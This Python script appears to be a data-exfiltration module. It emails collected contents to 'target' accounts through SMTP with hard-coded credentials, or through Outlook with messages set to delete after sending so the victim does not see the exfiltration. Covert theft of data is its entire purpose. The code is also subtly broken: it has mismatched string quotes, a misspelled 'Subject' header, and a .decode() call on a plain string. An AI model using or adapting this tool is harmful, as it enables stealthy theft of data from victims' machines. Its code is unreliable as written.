import smtplib
import time 
import win32com.client # Used for Outlook (windows).

smtp_server = 'smtp.example.com' # ex. smtp.gmail.com
smtp_port = 587
smtp_acct = 'tim@example.com'
smtp_password = 'seKret'
tgt_accts = ['tim@elsewhere.com']

def plain_email(subject, contents): # Function takes subject and contents as input and then forms a message. Incorporates SMTP server data and message contents.
    message = f'Subjet: {subject}\nFrom {smtp_acct}\n'
    message += f"to: {tgt_accts}\n\n{contents.decode()}'
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_acct, smtp_password) # Connect to the server with account name and password.

    #server.set_debuglevel(1) # If there are any issues with the function, use this debug line to see what's going on.
    server.sendmail(smtp_acct, tgt_accts, message) # Invoke the sendmail method with our and the targets account info, as well as the message.
    time.sleep(1)
    server.quit()

def outlook(subject, contents): # Same arguments as the plain mail.
    outlook = win32com.client.Dispatch("Outlook.Application") # Create an instance of the outlook application.
    message = outlook.CreateItem(0)
    message.DeleteAfterSubmit = True # Delete immediately after submitting. Stops the target from seeing the exfil in sent/deleted messages.
    message.Subject = subject
    message.Body = contents.decode()
    message.To = tgt_accts[0]
    message.Send()

if __name__ == '__main__':
    plain_email('subject here', 'contents here')
